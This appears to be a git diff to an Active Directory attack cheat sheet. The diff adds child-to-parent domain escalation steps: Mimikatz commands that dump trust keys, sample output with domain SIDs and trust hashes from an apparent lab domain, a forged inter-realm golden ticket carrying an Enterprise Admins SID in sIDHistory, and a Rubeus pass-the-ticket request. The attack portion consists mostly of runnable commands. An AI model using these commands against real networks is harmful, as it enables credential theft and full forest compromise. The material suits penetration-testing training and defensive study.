@@ -194,9 +194,9 @@ C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> 
 ---
 ### Escalate Across Trusts
 ---
-##### Child to Parent sIDHistory
+##### Child to Parent 
 ```powershell
-#`sIDHistory` is a user attribute designed for scenarios where a user is moved from one domain to another. 
+#`sIDHistory` (sids below) is a user attribute designed for scenarios where a user is moved from one domain to another. 
 # When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
 # AD permissions required. Get a cmd on a DA using rubeus or mimikatz
 
@@ -205,18 +205,24 @@ C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<parent-dc>$
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)   <-- Need This
 
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)           <-- Need This
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+   [[BLAH BLAH]]
+        * aes256_hmac       7db7b5f208df1b004304bc02df21dc145147b5f093a97aef79170dd1befdaf30
+        * aes128_hmac       d979ad3c525592356d62b641907e46cd
+        * rc4_hmac_nt       c4451dea556c1cdf20bd737ce7416d63                       <-- Need This
 
+# Create Inter Realm TGT on attacker machine. '/sids' is the sidhistory
+C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
+                              /sids:<parent_domain_sid>-519 /rc4:<rc4_hmac_nt> /service:krbtgt 
+                              /target:<target_domain_fqdn> /ticket:C:\trust_tkt.kirbi"'
 
-
+# Create a TGS using the created ticket
+C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
 
 ```
-
-
-
-
-
-
 
 ##### Across Forest
 
